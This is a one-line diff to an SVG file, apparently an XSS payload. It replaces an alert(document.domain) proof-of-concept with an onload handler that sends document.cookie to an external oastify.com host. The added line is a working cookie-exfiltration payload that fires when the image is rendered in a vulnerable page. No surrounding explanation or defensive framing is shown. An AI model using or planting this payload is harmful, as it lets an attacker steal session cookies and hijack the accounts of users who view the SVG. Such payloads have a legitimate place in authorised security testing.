@@ -1,1 +1,1 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://3hln2koboh0tsjc062pmuf8qnht9h55u.oastify.com?cookie='+document.cookie)"/>
